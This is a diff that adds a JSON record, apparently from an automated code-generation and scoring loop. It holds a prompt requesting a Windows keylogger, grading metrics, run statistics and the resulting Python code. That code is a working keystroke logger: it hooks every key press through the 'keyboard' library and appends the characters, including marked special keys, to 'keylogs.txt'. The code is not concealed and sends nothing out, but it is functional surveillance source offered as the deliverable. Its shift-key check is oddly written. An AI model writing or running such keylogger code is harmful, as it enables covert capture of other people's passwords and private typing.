@@ -1,0 +1,13 @@
+{
+  "goal": "Create a Python script that logs keyboard inputs to a file named \"keylogs.txt\" in a Windows environment.\n\n        Constraints:\n        The script must capture real-time keystrokes using a standard Python library.\n        Each keystroke should be appended to the log file immediately after it is pressed.\n        Alphabetical and numeric keys should be recorded using their character representation.\n        Special keys (Shift, Enter, Backspace) should be recorded in a readable format ([ENTER], [SHIFT]).\n        The script must handle errors gracefully and not crash during execution.\n\n        Output Requirements:\n        Output ONLY valid Python code (no explanations, comments optional but minimal).\n        Ensure the script runs without syntax errors.\n        Include all necessary imports.\n        The log file must be created in the same directory as the script.\n        Include basic debug print statements to confirm key capture.\n\n        Do not include any explanatory text outside the code.\n        ",
+  "metrics": {
+    "code_correctness": "Does the code function correctly? Full marks requires: 0 syntax errors, proper code structure and no runtime or compiliation errors.",
+    "alignment_to_goal": "Does the code solve the goal? Full marks requires for every requirement of the goal to be fulfilled.",
+    "readibility": "Is the code clean and understandable? Full marks requires proper code structure and naming conventions."
+  },
+  "completed_iterations": 10,
+  "stop_reason": "max_iterations_reached",
+  "final_score": 6,
+  "final_issue_count": 1,
+  "code": "import keyboard\ndef on_press(event):\n    try:\n        with open('keylogs.txt', 'a') as f:\n            print(f'Key captured: {event.name}')\n            if event.event_type == 'down':\n                if event.name.isalnum():\n                    f.write(event.name)\n                elif event.name == 'space':\n                    f.write(' ')\n                elif event.name == 'enter':\n                    f.write('[ENTER]')\n                elif event.name in ['shift', 'shift_l', 'shift_r'] and not keyboard.is_pressed('shift+shift'):\n                    f.write('[SHIFT]')\n                elif event.name == 'tab':\n                    f.write('[TAB]')\n                elif event.name == 'esc':\n                    f.write('[ESC]')\n                elif event.name == 'backspace':\n                    f.write('[BACKSPACE]')\n            # Add more special keys as needed\n    except OSError as e:\n        print(f'File Error: {str(e)}')\nkeyboard.on_press(on_press)\ntry:\n    keyboard.wait()\nexcept KeyboardInterrupt:\n    print('Keylogger stopped by user.')"
+}
